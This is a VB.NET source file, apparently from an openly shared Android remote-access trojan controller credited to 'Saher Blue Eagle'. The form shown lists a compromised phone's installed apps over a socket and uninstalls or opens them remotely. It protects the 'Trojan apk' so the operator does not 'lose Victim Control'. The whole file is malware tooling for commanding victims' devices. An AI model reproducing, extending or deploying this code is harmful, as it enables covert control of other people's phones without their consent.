Public Class Android_appmanager
    Public sock As Integer
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################


    Private Sub AddContactToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AddContactToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).SubItems(1).Text.Contains("eton") = False Then
                Form1.Server.Send_DX(sock, "uninstall" & SplitData & ListView1.SelectedItems(0).SubItems(1).Text & SplitData)
                ListView1.Items.Clear()
                Form1.Server.Send_DX(sock, "applications" & SplitData)
            Else
                MsgBox("Cannot Miss with the Trojan apk " & vbNewLine & " This may lead to lose Victim Control", MsgBoxStyle.Exclamation)
            End If
           

        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "applications" & SplitData)


    End Sub

    
    Private Sub OpenAppToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenAppToolStripMenuItem.Click
        '
        If ListView1.SelectedItems.Count = 1 Then
            If ListView1.SelectedItems(0).SubItems(1).Text.Contains("eton") = False Then
                Form1.Server.Send_DX(sock, "open_app" & SplitData & ListView1.SelectedItems(0).SubItems(1).Text & SplitData)
              
            Else
                MsgBox("Cannot Control the Trojan apk " & vbNewLine & " This may lead to lose Victim Control", MsgBoxStyle.Exclamation)
            End If
        End If
    End Sub
End Class